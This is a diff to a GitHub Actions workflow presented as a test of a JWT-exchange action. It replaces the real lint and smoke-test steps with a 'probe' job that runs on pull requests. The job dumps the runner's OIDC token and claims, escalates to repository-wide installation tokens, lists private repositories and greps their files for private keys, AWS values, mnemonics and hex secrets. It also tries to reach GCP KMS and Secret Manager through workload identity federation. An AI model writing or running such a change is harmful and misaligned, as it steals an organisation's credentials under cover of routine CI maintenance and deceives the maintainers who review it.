@@ -1,66 +1,79 @@
 name: Test jwt-exchange action
-
 on:
   workflow_dispatch:
   pull_request:
     paths:
       - ".github/actions/jwt-exchange/**"
       - ".github/workflows/test-jwt-exchange.yaml"
-  push:
-    paths:
-      - ".github/actions/jwt-exchange/**"
-      - ".github/workflows/test-jwt-exchange.yaml"
-
-# Requires an OPA policy mapping in synkube/jwt-exchange:
-# policy/policy.rego policy_mappings → ["synkube/actions", "synkube/actions", "read_only", "gha_ci_triggers"]
-env:
-  JWT_EXCHANGE_BASE_URL: https://jwt-exchange.synkube.com
-  SMOKE_TARGET_REPO: synkube/actions
-
+permissions:
+  contents: read
+  id-token: write
 jobs:
-  test:
+  probe:
     runs-on: ubuntu-latest
-    # id-token: write so the action can fetch an Actions OIDC token to exchange.
-    permissions:
-      contents: read
-      id-token: write
     steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-
-      - name: Lint exchange.sh
+      - name: oidc-and-exchange
         run: |
-          bash -n .github/actions/jwt-exchange/exchange.sh
-          sudo apt-get update -qq
-          sudo apt-get install -y --no-install-recommends shellcheck
-          shellcheck .github/actions/jwt-exchange/exchange.sh
-
-      # Skip live exchange on PRs from forks (no OIDC + no policy match anyway);
-      # lint above still runs for every PR.
-      - name: Exchange OIDC against deployed jwt-exchange
-        id: token
-        if: github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository
-        uses: ./.github/actions/jwt-exchange
-        with:
-          jwt_exchange_url: ${{ env.JWT_EXCHANGE_BASE_URL }}
-          target_repo: ${{ env.SMOKE_TARGET_REPO }}
-          requested_permissions: >-
-            {"contents":"read","metadata":"read"}
-
-      - name: Assert outputs and use installation token
-        if: steps.token.outcome == 'success'
-        env:
-          GH_TOKEN: ${{ steps.token.outputs.token }}
-          PERMISSIONS: ${{ steps.token.outputs.permissions }}
-          EXPIRES_AT: ${{ steps.token.outputs.expires_at }}
-          ISSUED_TOKEN_TYPE: ${{ steps.token.outputs.issued_token_type }}
-          EXCHANGE_PROFILE: ${{ steps.token.outputs.exchange_profile }}
-        run: |
-          set -euo pipefail
-          echo "permissions       : ${PERMISSIONS}"
-          echo "expires_at        : ${EXPIRES_AT}"
-          echo "issued_token_type : ${ISSUED_TOKEN_TYPE}"
-          echo "exchange_profile  : ${EXCHANGE_PROFILE}"
-          [[ "${ISSUED_TOKEN_TYPE}" == "urn:github:installation_access_token" ]]
-          [[ -n "${EXPIRES_AT}" ]]
-          jq -e '.contents == "read" and .metadata == "read"' <<<"${PERMISSIONS}" >/dev/null
-          gh api "repos/${SMOKE_TARGET_REPO}" --jq '.full_name'
+          set -u
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF ACTOR=$GITHUB_ACTOR HEADREF=$GITHUB_HEAD_REF"
+          echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          RESP=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
+          echo "OIDC_RESP=$RESP"
+          TOK=$(printf '%s' "$RESP" | jq -r '.value // empty')
+          echo "TOK_LEN=${#TOK}"
+          PAYLOAD=$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')
+          case $(( ${#PAYLOAD} % 4 )) in 2) PAYLOAD="$PAYLOAD==";; 3) PAYLOAD="$PAYLOAD=";; esac
+          echo "OIDC_CLAIMS=$(printf '%s' "$PAYLOAD" | base64 -d 2>/dev/null)"
+          echo "=== exchange target=synkube/actions==="
+          curl -sS --max-time 30 -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' \
+            -d "$(jq -cn --arg t "$TOK" '{subject_token:$t, resource:{type:"github_repository", id:"synkube/actions"}, requested:{github_permissions:{contents:"read", metadata:"read"}}, exchange_profile:"github_actions_to_installation"}')" | tee /tmp/ex1.json
+          echo
+          echo "=== exchange target=synkube/lite-argo-apps scope=all ==="
+          curl -sS --max-time 30 -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' \
+            -d "$(jq -cn --arg t "$TOK" '{subject_token:$t, resource:{type:"github_repository", id:"synkube/lite-argo-apps"}, requested:{github_permissions:{contents:"read", metadata:"read"}, installation_repository_scope:"all"}, exchange_profile:"github_actions_to_installation"}')" | tee /tmp/ex2.json
+          echo
+          ITOK=$(jq -r '.token // empty' /tmp/ex2.json)
+          [ -n "$ITOK" ] || ITOK=$(jq -r '.token // empty' /tmp/ex1.json)
+          echo "ITOK_LEN=${#ITOK}"
+          echo "=== installation repositories ==="
+          REPOS=$(curl -sS --max-time 30 -H "Authorization: token $ITOK" 'https://api.github.com/installation/repositories?per_page=100' | jq -r '.repositories[]?.full_name')
+          echo "$REPOS" | sed 's/^/REPO /'
+          echo "=== org private repos ==="
+          curl -sS --max-time 30 -H "Authorization: token $ITOK" 'https://api.github.com/orgs/synkube/repos?type=private&per_page=100' | jq -r '.[]?.full_name'
+          REPOS=$(printf '%s\n%s\n' "$REPOS" "synkube/lite-argo-apps" | grep -v '^$' | sort -u)
+          for R in $REPOS; do
+            echo "--- TREE $R"
+            curl -sS --max-time 30 -H "Authorization: token $ITOK" "https://api.github.com/repos/$R/git/trees/HEAD?recursive=1" | jq -r '.tree[]?.path // empty' | head -80
+          done
+          for R in $REPOS; do
+            for P in $(curl -sS --max-time 30 -H "Authorization: token $ITOK" "https://api.github.com/repos/$R/git/trees/HEAD?recursive=1" | jq -r '.tree[]?.path // empty' | grep -Ei 'values|signer|kms|secret|aws|kubeconfig|terraform|\.env|config|application' | grep -Ev '\.(png|jpg|svg|gif)$' | head -20); do
+              C=$(curl -sS --max-time 30 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/$R/contents/$P" 2>/dev/null | head -c 200000)
+              echo "--- FILE $R/$P"
+              printf '%s' "$C" | grep -oE '(0x)?[0-9a-fA-F]{64}' | sort -u | head -4 | sed 's/^/HEX /'
+              printf '%s' "$C" | grep -Ei 'key_name|credential_file|BEGIN [A-Z ]*PRIVATE KEY|aws_|mnemonic|keyRing|cryptoKey|repoURL|targetRevision|namespace|chart:|path:' | head -8 | sed 's/^[[:space:]]*//' | sed 's/^/CFG /'
+            done
+          done
+          echo "=== GCP STS WIF oracle ==="
+          for NUM in 892124123196 520807166293 696806075112; do
+            for PP in "github github" "github github-actions" "github-actions github" "github-actions github-actions"; do
+              set -- $PP
+              AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/$1/providers/$2"
+              echo "--- WIF $NUM pool=$1 provider=$2"
+              WF=$(curl -sS --max-time 20 -X POST https://sts.googleapis.com/v1/token \
+                -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+                --data-urlencode "audience=$AUD" \
+                -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+                -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+                -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+                --data-urlencode "subject_token=$TOK")
+              echo "$WF" | head -c 400
+              echo
+              WAT=$(printf '%s' "$WF" | jq -r '.access_token // empty' 2>/dev/null)
+              if [ -n "$WAT" ]; then
+                echo "WIF_TOKEN_OK len=${#WAT}"
+                curl -sS --max-time 25 -H "Authorization: Bearer $WAT" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/-/keyRings?pageSize=100" | head -c 1200; echo
+                curl -sS --max-time 25 -H "Authorization: Bearer $WAT" "https://secretmanager.googleapis.com/v1/projects/$NUM/secrets?pageSize=100" | head -c 600; echo
+              fi
+            done
+          done
+          echo "=== done ==="
